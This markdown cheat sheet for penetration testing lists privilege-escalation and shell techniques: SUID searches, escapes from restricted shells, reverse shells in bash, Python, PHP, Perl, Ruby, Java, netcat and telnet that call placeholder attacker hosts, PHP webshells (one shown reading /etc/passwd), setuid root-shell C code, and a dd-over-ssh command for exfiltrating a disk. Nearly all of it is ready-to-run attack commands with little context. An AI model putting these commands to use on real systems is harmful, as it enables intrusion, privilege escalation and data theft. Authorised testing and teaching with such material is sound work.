Side note: 
check for /bin/dash
Bash likes to drop setuid permissions but Dash will not

## Repo of shells you can upload 
https://github.com/tennc/webshell
```
git clone https://github.com/tennc/webshell.git
```
## More Reverse Shells
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


# Search for Commands that run as Root:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```


## Restricted Shells: rbash, rksh, rzsh, lshell and rssh
1. try ls, cd, pwd, echo commands [if these commands are restricted, 
   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
2. press tab twice to see what commands are available.
  - if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
  - echo /usr/bin/*  [use globbing to list directory contents]
  - important to check for operators and escape characters such as the following:
  ```
     > >> < | & ; : ' " `
  ```
3. Try commands wrapped
```
(whoami)
{whoami}
```

## Shell Execution:
```
find /home -exec sh -i \;
```
## use text editors vim, vi, nano, pico, ed
```
:!/bin/sh, !/bin/zsh, try other shells!?!?
:shell
:set shell=/bin/sh
:set shell=/bin/bash:shell
:!bash
```

## use pagers less, more, or programs like man that use less or more by default
```
!/bin/sh, !/bin/zsh, try other shells!?!?
!/bin/bash
!bash
```

## find
use find command’s exec parameter for code execution (returns shell)
```
sudo find /home -exec sh -i \;
find /var/log -name messages -exec /bin/bash -i \;
```

## use awk command
```
awk 'BEGIN {system("/bin/sh")}'
```

## use expect command
```
expect
spwan sh
sh
```

## use tee command to create a script in scenarios where text editors aren't available
```
echo "bash -i" | tee script.sh
```

## use nmap command
```
nmap --interactive
nmap> !sh
```

## use ssh with the following options to escape restricted shell 
```
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```

## Bash Shell:
```
exec /bin/bash 0&0 2>&0
```
Or:
```
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```
Or:
```
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
while read line 0<&5; do $line 2>&5 >&5; done
```

## Bash Reverse Shell:

```
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

# Programming Language:
## Python:
```
import os; os.system("/bin/sh")
```
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
```
import os; os.system("/bin/bash")
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
## Python Reverse Shell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP:
```
exec("sh -i");
```

## PHP Webshell:
```
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
```
usage examples
```
url/webshell.php?cmd=ls
```

```
<?php echo shell_exec($_REQUEST["Telepathy"]); ?>
```
```
<?php echo shell_exec($_GET["Telepathy"]); ?>
```
## PHP Webshell:
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
```
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```
Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the cmd GET parameter:
```
https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
```

## PHP Reverse Shell:
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## Perl:
```
exec "/bin/sh";
```
```
perl —e 'exec "/bin/sh";'
```
```
exec "/bin/bash";
```
```
perl —e 'exec "/bin/bash";'
```
## Perl Reverse Shell:
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Linux: doesn't depend on /bin/sh
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
### Windows: 
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```




## Ruby:
```
exec "/bin/sh"
```
```
ruby -e 'exec "/bin/sh"'
```
```
exec "/bin/bash"
```
```
ruby -e 'exec "/bin/bash"'
```
## Ruby Reverse Shell:
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### Linux: does not depend on /bin/sh
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
### Windows:
```
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```



## IRB:
```
exec "/bin/sh"
```

## Lua:
```
os.execute("/bin/sh")
```


## Java Reverse Shell:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Xterm Reverse Shell:
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
```
xterm -display 10.0.0.1:1
```
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
```
Xnest :1
```
You’ll need to authorise the target to connect to you (command also run on your host):
```
xhost +targetip
```

## Netcat Reverse Shell Linux:
```
nc -e /bin/sh 10.0.0.1 1234
nc -c /bin/sh attackerip 4444
/bin/sh | nc attackerip 4444
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```
## Netcat Reverse Shell Windows:
```
nc.exe 10.10.14.150 1234 -e powershell
```
## Telnet:
```
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
```
```
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
```



## C:
```
#include <stdio.h>

int main(int argc, char **argv)
{
	int status = system(bash);
	return 0;
}
```
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
```
### Building the SUID Shell binary
```
gcc -o suid suid.c 
gcc -o exploit exploit.c
``` 

### For 32 bit:
```
gcc -m32 -o suid suid.c  
gcc -m32 exploit.c -o exploit
```

### Compile Windows .exe on Linux
Build / compile windows exploits on Linux, resulting in a .exe file.
```
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```


# Encrypted exfil channel:
```
dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"
```



